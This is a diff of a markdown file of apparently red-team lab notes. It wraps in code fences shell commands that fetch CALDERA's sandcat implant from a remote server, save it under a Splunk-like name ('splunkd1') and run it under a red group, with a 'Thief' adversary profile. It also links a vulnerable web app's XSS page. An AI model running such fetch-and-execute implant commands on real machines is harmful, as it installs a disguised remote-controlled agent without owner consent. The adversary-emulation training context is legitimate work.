@@ -35,14 +35,18 @@ http://127.0.0.1/Vulnerable-Web-Application-master/XSS/XSS_level1.php
 [6c1d8c4afbc7f85f05fb2e4d17e5553255b0195a0b56ba5309e362e2156debfc]
 
 
+
+  
 ## CALDERA
 http://66.117.8.162:8888/<br>
 
+
+  ```sh
 server="http://66.117.8.162:8888";<br>
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd1;<br>
 chmod +x splunkd1;<br>
 ./splunkd1 -server $server -group red1 -v<br>
-
+  ```
 
 As root user<br>
 
@@ -50,11 +54,13 @@ Change N by your Id on "splunkdN"<br>
 Change N by your Id on "redN"<br>
 run the following command : <br>
 
+  ```sh
 server="http://66.117.8.162:8888";
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkdN;<br>
 chmod +x splunkdN;<br>
 ./splunkdN -server $server -group redN -v<br>
-
+  ```
+  
 Verified agent status<br>
 Define Adversaries profile : Thief<br>
 Expand operation<br>
